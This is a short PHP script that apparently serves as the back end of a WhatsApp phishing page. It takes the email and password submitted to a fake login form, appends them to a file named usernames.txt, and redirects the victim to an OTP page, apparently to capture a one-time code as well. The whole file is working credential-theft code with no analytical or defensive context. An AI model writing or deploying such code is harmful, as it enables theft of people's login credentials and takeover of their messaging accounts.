<?php 
file_put_contents("usernames.txt", "whatsapp Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n\n", FILE_APPEND);
header('Location: otp.html');
exit();
?>
